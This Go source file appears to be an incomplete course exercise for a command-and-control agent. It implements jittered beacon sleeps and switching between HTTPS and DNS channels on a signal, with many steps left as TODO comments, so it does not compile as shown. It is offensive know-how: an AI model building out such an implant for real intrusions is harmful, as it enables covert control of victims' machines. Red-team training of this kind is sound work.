package agent

import (
	"context"
	"encoding/json"
	"log"
	"math/rand"
	"time"

	"c2framework/internals/config"
	"c2framework/internals/server"
)

// CalculateSleepDuration calculates the actual sleep time with jitter
func CalculateSleepDuration(baseDelay time.Duration, jitterPercent int) time.Duration {
	if jitterPercent == 0 {
		return baseDelay
	}

	// Calculate jitter range
	jitterRange := float64(baseDelay) * float64(jitterPercent) / 100.0

	// Random value between -jitterRange and +jitterRange
	jitter := (rand.Float64()*2 - 1) * jitterRange

	// Calculate final duration
	finalDuration := float64(baseDelay) + jitter

	// Ensure we don't go negative
	if finalDuration < 0 {
		finalDuration = 0
	}

	return time.Duration(finalDuration)
}

// detectTransition checks if the response indicates we should switch protocols
func detectTransition(protocol string, response []byte) bool {

	// TODO: Add switch with http and dns case

	// For case HTTPS
	// TODO create var httpsResp of type server.HTTPSResponse
	// TODO: unmarshall response into ref to httpsResp
	// TODO: return httpsResp.Change

	// For case DNS
	// TODO: assign ipAddr equal to string(response)
	// TODO: return ipAddr with value of "69.69.69.69"

	// TODO: return false
}

// RunLoop runs the agent communication loop
func RunLoop(ctx context.Context, comm Agent, cfg *config.AgentConfig) error {
	// Track current state
	// TODO: Create currentProtocol equal to cfg.Protocol
	// TODO: Create currentAgent equal to comm

	for {
		// Check if context is cancelled
		select {
		case <-ctx.Done():
			log.Println("Run loop cancelled")
			return nil
		default:
		}

		// TODO: response is equal to return from calling currentAgent.Send(), pass context as argument

		if err != nil {
			log.Printf("Error sending request: %v", err)
			// Don't exit - just sleep and try again
			time.Sleep(cfg.Timing.Delay)
			continue // Skip to next iteration
		}

		// Check if this is a transition signal

		if detectTransition(currentProtocol, response) {
			log.Printf("TRANSITION SIGNAL DETECTED! Switching protocols...")

			// Figure out what protocol to switch TO
			// TODO: Set newProtocol to DNS
			// TODO if currentProtocol is DNS, change newProtocol to HTTPS

			// Create config for new protocol
			// TODO: assign tempConfig equal to cfg
			// TODO: assign tempConfig.Protocol equal to newProtocol

			// Try to create new agent
			// TODO: create newAgent with Factory Function, pass tempConfig

			if err != nil {
				log.Printf("Failed to create %s agent: %v", newProtocol, err)
				// Don't switch if we can't create agent
			} else {
				// Update our tracking variables
				log.Printf("Successfully switched from %s to %s", currentProtocol, newProtocol)
				// This means we CAN create new agent, so
				// TODO: assign currentProtocol equal to newProtocol
				// TODO: assign currentAgent equal to newAgent

			}
		} else {
			// Normal response - parse and log as before
			switch currentProtocol { // Note: use currentProtocol, not cfg.Protocol
			case "https":
				var httpsResp server.HTTPSResponse
				json.Unmarshal(response, &httpsResp)
				log.Printf("Received response: change=%v", httpsResp.Change)
			case "dns":
				ipAddr := string(response)
				log.Printf("Received response: IP=%v", ipAddr)
			}
		}

		// Calculate sleep duration with jitter
		sleepDuration := CalculateSleepDuration(cfg.Timing.Delay, cfg.Timing.Jitter)
		log.Printf("Sleeping for %v", sleepDuration)

		// Sleep with cancellation support
		select {
		case <-time.After(sleepDuration):
			// Continue to next iteration
		case <-ctx.Done():
			log.Println("Run loop cancelled")
			return nil
		}
	}
}
